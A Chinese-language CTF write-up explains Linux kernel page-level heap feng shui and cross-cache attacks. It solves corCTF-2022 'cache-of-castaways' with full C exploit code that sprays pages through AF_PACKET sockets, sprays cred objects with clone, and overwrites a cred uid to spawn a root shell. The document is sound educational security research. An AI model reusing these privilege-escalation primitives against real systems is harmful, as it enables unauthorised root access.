---
title: 【KPWN】Cross-Cache Attack
description: 一直没有看 cross cache，今天来看看
pubDate: 2024-11-06
authors:
- nova
---

一直没有看 cross cache，今天来看看

<!--truncate-->

## 页级堆风水 (Page-level heap fengshui)

我们知道，linux 内核中 slub 的布局是非常难以揣摩的，每个 slub 前后是哪个 slub，或者说下一个分配到的 slub 在哪，由于内核中存在非常多的 alloc / free，我们几乎无法去预测 slub 布局。然而，通过页风水的方式，我们可以人为地制造成功率较高的可控布局。

用 Buddy System 分配页的时候，我们有一个 order 的说法。每个 order 里保存了以 $$2^{order}$$ 个页面为一组的双向链表，而显然这些在初始化的时候是物理连续的。对于 `n-order` 的 free-area，如果它为空，就会从 `n+1-order` 的 free-area 中拆出一半用于返回给 allocator，剩下一半放入 `n-order` 中。

而在页面释放时，它们同样会被放入对应的 free-area 上（FIFO）。此时，如果存在物理连续的 `n-order` buddies，也会被合并，再放入到 `n+1-order` 的 free-area 上。

> 具体可以参考 a3 的 https://arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II

那么我们不难想到这样一件事，以 `order-0` 举例，假如 `order-0` 为空，下次 allocator 需要 1 页的时候，就会从 `order-1` 中拿取一组界面，也就是 $$2^1=2$$ 页回来，一个返回给 allocator，一个用于补充 `free_area[0]`，这两个页显然是物理连续的。

那么如果是 `vuln slub` 拿到了第一个界面，紧接着 `victim slub` 拿到了第二个页，那么我们自然就造出了可控的页布局，也就是完成了所谓的页风水。

:::warning

然而，这种方式并不稳定，只能说尽可能地增加了成功率。

这是因为 kernel 大量的使用了 order-0 的界面，而没有 ACCOUNT 标志的 slub 往往会被重用，因此就算我们能够控制 `vuln slub` 和 `victim slub` 的页面物理相邻，我们仍然无法确保 `vuln obj` 和 `victim obj` 是物理相邻的 —— 即 `vuln obj` 位于 `vuln slub` 末尾，`victom obj` 位于 `victim slub` 开头。

:::

因此，在 real CVE 中，一般页风水被用在非 `order-0` 的攻击原语中。



## Cross Cache

Cross Cache，在我们完成页风水后，显然容易理解了 —— 就是通过溢出 `vuln obj` 这个 kmem_cache 来影响 `victim slub` 中的 `victim obj` 的攻击手法。

![](https://oss.nova.gal/img/heap_layout2.gif)

非常推荐阅读笑尘的 [CVE-2022-27666: Exploit esp6 modules in Linux kernel - ETenal](https://etenal.me/archives/1825)，他用（尽管不是那么）精美（但是）浅显易懂的 PPT 做了动画，解释了整个 Cross Cache 的过程。





## 理想情况

在没有任何噪声的情况下，我们可以设想如下攻击模型

```python
for x in range(0x200):
    alloc_page()  # 用尽 low-order pages
for x in range(1, 0x200, 2):
    free_page(x)  # 释放奇数页，确保不会形成 buddies 从而合并到 high-order
spray_victim_obj()  # 堆喷 victim obj
for x in range(0, 0x200, 2):
    free_page(x)  # 释放偶数页，同上
spray_vulnerable_obj()  # 堆喷 vuln obj
overflow_vulnerable_obj()  # 堆溢出，自然会有位于 `vuln slub` 末尾的 obj 溢出到位于 `victim slub` 头的 obj
```

然而，假设有噪声，i.e. 内核自己的结构体拿了我们刚释放的页，或是又多了新的页放入到 low-order area 中，亦或是因为 slub alias 导致 `victim slub` 头不再是 victim obj。我们的攻击就有可能失败。



## corCTF-2022 cache-of-castaways

这大概是少有的 cross cache 的 CTF 题目。对于实战，你可以参阅 [CVE-2022-29582 - Computer security and related topics](https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/) [CVE-2022-27666: Exploit esp6 modules in Linux kernel - ETenal](https://etenal.me/archives/1825) 或是 [Project Zero: Exploiting the Linux kernel via packet sockets](https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html)

题目附件可以在这里下载：[corCTF-2022-public-challenge-archive/pwn/cache-of-castaways at master · Crusaders-of-Rust/corCTF-2022-public-challenge-archive](https://github.com/Crusaders-of-Rust/corCTF-2022-public-challenge-archive/tree/master/pwn/cache-of-castaways)



题目本身非常简单，提供了 add 和 edit 的功能，存在 6bytes 的溢出。其中，这个溢出的 cache 是 SLAB_ACCOUNT 标志位的，因此它占用一个独立的 slub。

![image-20241106160439301](https://oss.nova.gal/img/image-20241106160439301.png)

而溢出 6bytes，显然也支持我们将 cred 的 UID 写为 0。恰巧 cred_jar 显然也在 ACCOUNT 的独立 slub 里，因此我们其实能够排除一部分噪声。



那么接下来，我们就顺着理想情况一步一步来分析即可。首先是 `alloc_page`，在 `CVE-2017-7308` 中 project zero 提出了一个非常优雅的页喷射原语：`setsockopt()`。

>[Project Zero: Exploiting the Linux kernel via packet sockets](https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html)

在设置完成后，它会调用 `alloc_pg_vec()`，在这个函数里，它会分配 `tp_block_nr` 次 `2^order` 个页面（其中 order 是由 `tp_block_size` 决定的），而在关闭 fd 后，这些页面也会被释放。只不过低权限用户在 root namespaces 下没有办法调用这个函数，必须要换一个命名空间，此时，我们可以使用 pipe 进行通信。

```c
#include "kernel.h"

#define INITIAL_PAGE_SPRAY 1000
#define CRED_JAR_SPARY 512
#define SIZE 0x1000
#define PAGENUM 1

int sprayfd_child[2], sprayfd_parent[2];
int socketfds[INITIAL_PAGE_SPRAY];

enum spraypage_cmd {
    ALLOC,
    FREE,
    QUIT
};

struct ipc_req_t {
    enum spraypage_cmd cmd;
    int idx;
};

void spraypage_send(enum spraypage_cmd cmd, int idx) {
    struct ipc_req_t req;
    req.cmd = cmd;
    req.idx = idx;
    write(sprayfd_child[1], &req, sizeof(req));
    read(sprayfd_parent[0], &req, sizeof(req));  // just for synchornization
}

void spray_pages() {
    struct ipc_req_t req;
    do {
        read(sprayfd_child[0], &req, sizeof(req));
        switch (req.cmd) {
            case ALLOC:
                socketfds[req.idx] = alloc_pages_via_sock(SIZE, req.idx);
                break;
            case FREE:
                close(socketfds[req.idx]);
                break;
            case QUIT:
                break;
            default:
                assert(0);
        }
        write(sprayfd_parent[1], &req, sizeof(req));
    }
    while (req.cmd != QUIT);
}

int main() {

    bind_cpu(0);
    int fd = open("/dev/castaway", O_RDWR);
    if (fd < 0) {
        printf("Error opening device\n");
        return 1;
    }

    pipe(sprayfd_child);
    pipe(sprayfd_parent);

    if (!fork()) {
        unshare_setup(getuid(), getgid());
        spray_pages();
    }

    for (int i = 0; i < INITIAL_PAGE_SPRAY; i++) {
        spraypage_send(ALLOC, i);
    }
}


```

我们使用 fork 开了一个子进程，然后将子进程放到单独的命名空间里，并且用管道进行通信。

这两个函数定义如下

```c
void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];
    unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);
    
    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);
    
    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
    return;
}

int alloc_pages_via_sock(uint32_t size, uint32_t n)
{
    struct tpacket_req req;
    int32_t socketfd, version;

    socketfd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socketfd < 0)
    {
        perror("bad socket");
        exit(-1);
    }

    version = TPACKET_V1;

    if (setsockopt(socketfd, SOL_PACKET, PACKET_VERSION, &version, sizeof(version)) < 0)
    {
        perror("setsockopt PACKET_VERSION failed");
        exit(-1);
    }

    assert(size % 4096 == 0);

    memset(&req, 0, sizeof(req));

    req.tp_block_size = size;
    req.tp_block_nr = n;
    req.tp_frame_size = 4096;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    if (setsockopt(socketfd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0)
    {
        perror("setsockopt PACKET_TX_RING failed");
        exit(-1);
    }

    return socketfd;
}
```



接下来进行第二步，释放奇数页，然后喷 cred。

但是我们需要注意噪声问题。fork 会引入大量噪声，因此，我们可以只通过 clone 系统调用，从而减少噪声。使用 `CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND` 作为 FLAG，这样每一次就只会有 4 个 `order-0` 的分配， 对于后面的操作，我们也尽可能只使用汇编，尽量减少噪声。

在这里，我们将每一个 clone 引到 check_and_wait 函数里，它在 rootfd 接到消息后就检查是不是 root，如果不是就进入睡眠。

```c
#define CLONE_FLAGS CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND

int rootfd[2];
struct timespec timer = {.tv_sec = 1000000000, .tv_nsec = 0};
char throwaway;
char root[] = "root\n";
char binsh[] = "/bin/sh\x00";
char *args[] = {"/bin/sh", NULL};

__attribute__((naked)) void check_and_wait()
{
    asm(
        "lea rax, [rootfd];"
        "mov edi, dword ptr [rax];"
        "lea rsi, [throwaway];"
        "mov rdx, 1;"
        "xor rax, rax;"
        "syscall;"
        "mov rax, 102;"
        "syscall;"
        "cmp rax, 0;"
        "jne finish;"
        "mov rdi, 1;"
        "lea rsi, [root];"
        "mov rdx, 5;"
        "mov rax, 1;"
        "syscall;"
        "lea rdi, [binsh];"
        "lea rsi, [args];"
        "xor rdx, rdx;"
        "mov rax, 59;"
        "syscall;"
        "finish:"
        "lea rdi, [timer];"
        "xor rsi, rsi;"
        "mov rax, 35;"
        "syscall;"
        "ret;");
}

int main() {

    bind_cpu(0);
    int fd = open("/dev/castaway", O_RDWR);
    if (fd < 0) {
        printf("Error opening device\n");
        return 1;
    }

    pipe(sprayfd_child);
    pipe(sprayfd_parent);
    pipe(rootfd);

    for (int i = 0; i < CRED_JAR_SPARY; i++) {
        pid_t pid = fork();
        if (!pid) {
            sleep(10000);
        }
        else if (pid < 0) {
            errExit("fork");
        }
    }

    if (!fork()) {
        unshare_setup(getuid(), getgid());
        spray_pages();
    }

    for (int i = 0; i < INITIAL_PAGE_SPRAY; i++) {
        spraypage_send(ALLOC, i);
    }

    puts("\033[32m[*] Initial pages sprayed\033[0m");
    puts("\033[32m[+] Start to free odd pages\033[0m");

    for (int i = 1; i < INITIAL_PAGE_SPRAY; i += 2) {
        spraypage_send(FREE, i);
    }

    puts("\033[32m[+] Start to spray creds\033[0m");
    for (int i = 0; i < FORK_SPRAY; i++) 
        pid_t pid = __clone(CLONE_FLAGS, &check_and_wait);
}
```



既然 victim obj 已经喷完了，那么就开始继续释放偶数页面，然后喷 vuln obj 了。喷完之后，我们设置 uid 位为 1，成功拿到了 rootshell



![image-20241106201611213](https://oss.nova.gal/img/image-20241106201611213.png)

最终 exp：

```c
#include "kernel.h"

#define CLONE_FLAGS CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND

#define INITIAL_PAGE_SPRAY 1000
#define VULN_SPRAY 400
#define CRED_JAR_SPARY 512
#define SIZE 0x1000
#define PAGENUM 1

int fd;
int sprayfd_child[2], sprayfd_parent[2];
int rootfd[2];
int socketfds[INITIAL_PAGE_SPRAY];

enum spraypage_cmd {
    ALLOC,
    FREE,
    QUIT
};

struct ipc_req_t {
    enum spraypage_cmd cmd;
    int idx;
};

struct castaway_request {
    int64_t index;
    size_t	size;
    void 	*buf;
};

struct timespec timer = {.tv_sec = 1000000000, .tv_nsec = 0};
char throwaway;
char root[] = "root\n";
char binsh[] = "/bin/sh\x00";
char *args[] = {"/bin/sh", NULL};

void edit(int64_t index, size_t size, void *buf)
{
    struct castaway_request r = {
        .index = index,
        .size = size,
        .buf = buf,
    };

    ioctl(fd, 0xF00DBABE, &r);
}


__attribute__((naked)) void check_and_wait()
{
    asm(
        "lea rax, [rootfd];"
        "mov edi, dword ptr [rax];"
        "lea rsi, [throwaway];"
        "mov rdx, 1;"
        "xor rax, rax;"
        "syscall;"
        "mov rax, 102;"
        "syscall;"
        "cmp rax, 0;"
        "jne finish;"
        "mov rdi, 1;"
        "lea rsi, [root];"
        "mov rdx, 5;"
        "mov rax, 1;"
        "syscall;"
        "lea rdi, [binsh];"
        "lea rsi, [args];"
        "xor rdx, rdx;"
        "mov rax, 59;"
        "syscall;"
        "finish:"
        "lea rdi, [timer];"
        "xor rsi, rsi;"
        "mov rax, 35;"
        "syscall;"
        "ret;");
}

void spraypage_send(enum spraypage_cmd cmd, int idx) {
    struct ipc_req_t req;
    req.cmd = cmd;
    req.idx = idx;
    write(sprayfd_child[1], &req, sizeof(req));
    read(sprayfd_parent[0], &req, sizeof(req));
}

void spray_pages() {
    struct ipc_req_t req;
    do {
        read(sprayfd_child[0], &req, sizeof(req));
        switch (req.cmd) {
            case ALLOC:
                socketfds[req.idx] = alloc_pages_via_sock(SIZE, req.idx);
                break;
            case FREE:
                close(socketfds[req.idx]);
                break;
            case QUIT:
                break;
            default:
                assert(0);
        }
        write(sprayfd_parent[1], &req.idx, sizeof(req.idx));
    }
    while (req.cmd != QUIT);
}

int main() {

    bind_cpu(0);
    fd = open("/dev/castaway", O_RDWR);
    if (fd < 0) {
        printf("Error opening device\n");
        return 1;
    }

    pipe(sprayfd_child);
    pipe(sprayfd_parent);
    pipe(rootfd);

    char data[0x200];;
    memset(data, 0, sizeof(data));

    puts("\033[32m[+] Start to spray pages\033[0m");
    if (!fork()) {
        unshare_setup(getuid(), getgid());
        spray_pages();
    }

    for (int i = 0; i < INITIAL_PAGE_SPRAY; i++) {
        spraypage_send(ALLOC, i);
    }

    puts("\033[32m[*] Initial pages sprayed\033[0m");
    puts("\033[32m[+] Start to free odd pages\033[0m");

    for (int i = 1; i < INITIAL_PAGE_SPRAY; i += 2) {
        spraypage_send(FREE, i);
    }

    puts("\033[32m[+] Start to spray creds\033[0m");
    printf("%p\n", &check_and_wait);
    for (int i = 0; i < CRED_JAR_SPARY; i++) {
        pid_t pid = __clone(CLONE_FLAGS, &check_and_wait);
        if (pid < 0) {
            errExit("clone");
        }
    }

    puts("\033[32m[+] Start to spray vulnerabilities\033[0m");
    for (int i = 0; i < INITIAL_PAGE_SPRAY; i += 2) {
        spraypage_send(FREE, i);
    }

    *(uint32_t *)(&data[0x200-6]) = 1;
    for (int i = 0; i < VULN_SPRAY; i++) {
        ioctl(fd, 0xcafebabe);
        edit(i, 0x200, data);
    }

    puts("\033[32m[+] Let's roll\033[0m");

    write(rootfd[1], data, sizeof(data));
    sleep(1000000000);
}
```

注意它仍然有概率失败。



现在，让我们来看一看这些数字的选择：

- INITIAL_PAGE_SPRAY：我们喷了 1000 个页面，这显然有助于我们耗尽 low-order 页面，拆出 high-order 页面。注意，这里我们首先肯定也会先把 low-order 的页面放入 low-order 的 free-area 里，然后才会把奇数的页面放入。
- CRED_JAR_SPRAY: 我们喷了 512 个。一个 cred_jar 是 32 个 slub，这就相当于 0x10 个页面，其实很少，可以多喷一些，不过由于我们 VULN_SPRAY 被限定了 400 个，也就是 50 个页，所以其实太大也没用，够不到了。
- VULN_SPRAY: 给 400 个我们就喷 400 个吧

:::info

如果考虑优化，我们还能进一步提升命中率

在 PAGE 这里，我们可以确保 free 的 page 都是 Contiguous Pages —— 即所有我们用来分配 vuln 和 victim 的 slub page 都是从 high-order 拆出来的。

想要做到这样，我们首先耗尽 low-order pages，紧接着只需要在释放页面的时候确保是 Contiguous Page 即可，也就是说，我们可以增加一个常量 DRAIN_PAGES，用于存放不连续的页面，然后在他之后的 PAGE_SPRAY 个页面，我们认为是连续的，并且进行释放和重用。

然而实际尝试之后，我发现命中率并没有提升，甚至大幅度下降了。我猜测应该是内核噪声占用了这些 slub 的原因？

:::
